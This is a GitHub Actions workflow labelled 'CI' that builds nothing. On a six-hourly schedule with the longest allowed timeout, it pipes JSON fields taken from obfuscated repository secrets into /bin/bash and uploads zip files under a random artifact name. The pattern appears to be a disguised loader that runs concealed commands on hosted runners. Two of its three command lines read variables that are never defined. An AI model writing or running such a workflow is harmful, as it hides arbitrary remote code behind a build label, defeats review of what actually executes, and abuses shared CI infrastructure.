name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '4 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          whys25780: ${{ secrets.whys25780 }}
        run: |
          printf '%s' "$whys25780" | jq -r .coe85310 | /bin/bash
          printf '%s' "$ntz929" | jq -r .hogis78462 | /bin/bash
          printf '%s' "$qsgdf33611" | jq -r .hj2368 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fOaGiqtl
          path: "*.zip"
          retention-days: 1
